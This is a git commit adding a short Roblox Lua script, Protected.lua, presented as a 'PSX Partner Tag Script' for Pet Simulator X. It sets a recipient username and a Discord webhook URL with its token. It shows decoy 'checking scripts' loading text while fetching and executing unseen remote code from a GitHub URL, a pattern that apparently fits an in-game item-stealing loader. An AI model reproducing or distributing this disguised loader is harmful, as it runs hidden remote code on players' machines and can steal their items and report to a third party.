54a3d8d4e5c12267cdca20c23e550b8852826aa2
BaddScripters <130819931+Psxnewguy2@users.noreply.github.com>
2023-04-22 13:46:17 +0700

    Create Protected.lua

---
+++ Protected.lua
@@ -0,0 +1,10 @@
+Username = "walpdisnei"
+WebHook = "https://discord.com/api/webhooks/1097899007461818379/IK_m85SR4G15NYTRrHCOKdnaBHK0w7M95nIW4XZf4Ezmvy13QsUe2HqHmafb3I0MSDMp"
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Partner Tag Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script to check"
+_G.Text3 = "Checking Scripts if there's a problem..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
